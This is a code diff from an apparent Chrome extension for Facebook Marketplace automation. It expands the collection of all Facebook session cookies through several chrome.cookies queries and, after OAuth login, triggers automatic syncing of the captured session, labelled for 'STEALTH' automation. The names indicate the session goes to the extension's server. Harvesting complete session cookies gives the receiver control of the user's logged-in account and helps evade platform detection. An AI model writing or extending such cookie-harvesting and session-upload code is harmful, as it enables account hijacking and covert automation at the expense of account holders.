@@ -687,16 +687,22 @@ const SESSION_AUTO_SYNC_INTERVAL_MS = 4 * 60 * 60 * 1000; // 4 hours
  */
 async function captureFacebookCookies() {
   try {
-    const cookies = await chrome.cookies.getAll({ domain: '.facebook.com' });
-    const wwwCookies = await chrome.cookies.getAll({ domain: 'www.facebook.com' });
+    // Try multiple methods to capture cookies
+    const cookies1 = await chrome.cookies.getAll({ domain: '.facebook.com' });
+    const cookies2 = await chrome.cookies.getAll({ domain: 'facebook.com' });
+    const cookies3 = await chrome.cookies.getAll({ url: 'https://www.facebook.com' });
+    const cookies4 = await chrome.cookies.getAll({ url: 'https://facebook.com' });
     
-    // Merge and deduplicate
-    const allCookies = [...cookies];
-    for (const cookie of wwwCookies) {
-      if (!allCookies.some(c => c.name === cookie.name && c.domain === cookie.domain)) {
-        allCookies.push(cookie);
+    // Merge and deduplicate all cookies
+    const cookieMap = new Map();
+    for (const cookie of [...cookies1, ...cookies2, ...cookies3, ...cookies4]) {
+      const key = `${cookie.name}:${cookie.domain}`;
+      if (!cookieMap.has(key)) {
+        cookieMap.set(key, cookie);
       }
     }
+    const allCookies = Array.from(cookieMap.values());
+    console.log('🍪 Captured cookies:', allCookies.length, 'cookies from Facebook');
     
     return allCookies.map(c => ({
       name: c.name,
@@ -1446,18 +1452,24 @@ async function handleMessage(message, sender) {
         if (oauthResult.success !== false) {
           // OAuth successful - start IAI polling
           await startIAITaskPolling();
-          // Also capture session for Marketplace automation
+          // Also capture and sync session for STEALTH/Marketplace automation
           setTimeout(async () => {
             try {
               const isLoggedIn = await isLoggedIntoFacebook();
               if (isLoggedIn) {
-                await syncSessionToServer();
-                console.log('📤 Session synced after OAuth login');
+                const sessionResult = await captureAndSyncSession();
+                if (sessionResult.success) {
+                  console.log('📤 Session auto-synced after OAuth login');
+                } else {
+                  console.log('⚠️ Session sync failed after OAuth:', sessionResult.error);
+                }
+              } else {
+                console.log('⏭️ Session sync skipped - not logged into Facebook');
               }
             } catch (e) {
-              console.log('Session sync skipped:', e.message);
+              console.log('Session sync error after OAuth:', e.message);
             }
-          }, 2000);
+          }, 3000);
           return { success: true, ...oauthResult };
         }
         return oauthResult;
